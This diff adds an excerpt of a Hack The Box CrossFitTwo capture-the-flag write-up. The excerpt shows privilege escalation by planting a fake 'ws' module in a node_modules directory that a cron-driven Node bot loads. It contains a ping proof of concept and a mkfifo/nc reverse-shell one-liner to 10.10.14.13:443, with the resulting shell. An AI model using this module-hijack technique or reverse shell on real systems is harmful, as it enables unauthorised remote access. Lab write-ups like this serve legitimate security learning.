@@ -1,0 +1,67 @@
+
+########
+#############################
+## https://0xdf.gitlab.io/2021/08/14/htb-crossfittwo.html
+#############################
+########
+
+
+Strategy
+The search order means that if I can create a node_modules directory in any folder between / and /opt/sysadmin/server/statbot, the bot will try to load my script in place of the legit library. I’ll have to work fast, as every few minutes there’s a cron that cleans up the node_modules directory.
+
+POC
+To test, I’ll use the child_process module to run system commands. I’ll use a ping to start.
+
+require('child_process').execSync('ping -c 1 10.10.14.13');
+First I’ll create the directory, then put the module into it:
+
+crossfit2$ mkdir -p /opt/sysadmin/node_modules/ws/
+crossfit2$ echo "require('child_process').execSync('ping -c 1 10.10.14.13');" > /opt/sysadmin/node_modules/ws/index.js 
+When I run the script, it still errors out, but this time failing to import log-to-file:
+
+crossfit2$ node /opt/sysadmin/server/statbot/statbot.js
+internal/modules/cjs/loader.js:985
+  throw err;
+  ^
+
+Error: Cannot find module 'log-to-file'
+Require stack:
+- /opt/sysadmin/server/statbot/statbot.js
+    at Function.Module._resolveFilename (internal/modules/cjs/loader.js:982:15)
+    at Function.Module._load (internal/modules/cjs/loader.js:864:27)
+    at Module.require (internal/modules/cjs/loader.js:1044:19)
+    at require (internal/modules/cjs/helpers.js:77:18)
+    at Object.<anonymous> (/opt/sysadmin/server/statbot/statbot.js:3:16)
+    at Module._compile (internal/modules/cjs/loader.js:1158:30)
+    at Object.Module._extensions..js (internal/modules/cjs/loader.js:1178:10)
+    at Module.load (internal/modules/cjs/loader.js:1002:32)
+    at Function.Module._load (internal/modules/cjs/loader.js:901:14)
+    at Function.executeUserEntryPoint [as runMain] (internal/modules/run_main.js:74:12) {
+  code: 'MODULE_NOT_FOUND',
+  requireStack: [ '/opt/sysadmin/server/statbot/statbot.js' ]
+}
+There’s also an ICMP packet at tcpdump:
+
+16:21:51.245776 IP 10.10.10.232 > 10.10.14.13: ICMP echo request, id 10214, seq 0, length 64
+16:21:51.245814 IP 10.10.14.13 > 10.10.10.232: ICMP echo reply, id 10214, seq 0, length 64
+More importantly, around the time the cron runs, there’s another packet (two shown a minute apart):
+
+16:21:55.359840 IP 10.10.10.232 > 10.10.14.13: ICMP echo request, id 33195, seq 0, length 64
+16:21:55.359881 IP 10.10.14.13 > 10.10.10.232: ICMP echo reply, id 33195, seq 0, length 64
+16:22:55.098196 IP 10.10.10.232 > 10.10.14.13: ICMP echo request, id 57123, seq 0, length 64
+16:22:55.098233 IP 10.10.14.13 > 10.10.10.232: ICMP echo reply, id 57123, seq 0, length 64
+Shell
+The box is BSD, so the standard reverse shells may or may not work. nc is on the box, so I’ll replace the ping with a mkfifo reverse shell:
+
+crossfit2$ mkdir -p /opt/sysadmin/node_modules/ws/
+crossfit2$ echo "require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.13 443 >/tmp/f');" > /opt/sysadmin/node_modules/ws/index.js
+Once the minute rolls over, there’s a connect at my waiting nc:
+
+oxdf@parrot$ nc -lvnp 443
+listening on [any] 443 ...
+connect to [10.10.14.13] from (UNKNOWN) [10.10.10.232] 2807
+/bin/sh: No controlling tty (open /dev/tty: Device not configured)
+/bin/sh: Can't find tty file descriptor
+/bin/sh: warning: won't have full job control
+crossfit2$ id
+uid=1005(john) gid=1005(john) groups=1005(john), 20(staff), 1003(sysadmins)
